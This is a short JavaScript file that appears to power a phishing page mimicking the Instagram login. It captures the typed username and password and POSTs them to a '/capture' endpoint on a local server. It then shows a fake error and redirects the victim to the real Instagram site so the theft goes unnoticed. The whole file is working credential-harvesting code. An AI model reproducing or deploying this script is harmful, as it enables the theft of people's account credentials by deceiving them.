document.addEventListener("DOMContentLoaded", function () {
  const loginFormButton = document.querySelector(".login-form-button");

  loginFormButton.addEventListener("click", async function (event) {
    event.preventDefault();

    const username = document.querySelector("input[type='text']").value;
    const password = document.querySelector("input[type='password']").value;

    if (!username || !password) {
      document.getElementById('message-erreur').style.display = 'block';
      setTimeout(function () {
        
        window.location.replace("https://www.instagram.com/accounts/login/"); 
      }, 3000); 
      return;
    }

  

    try {
      const response = await fetch("http://localhost:5002/capture", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ username, password }),
      });

      if (response.ok) {
        document.getElementById('message-erreur').style.display = 'block';
        window.location.replace("https://www.instagram.com");
      } else {
        document.getElementById('message-erreur').style.display = 'block';
        window.location.replace("https://www.instagram.com");
      }
    } catch (error) {
      document.getElementById('message-erreur').style.display = 'block';

      
      window.location.replace("https://www.instagram.com");
    }
  });
});
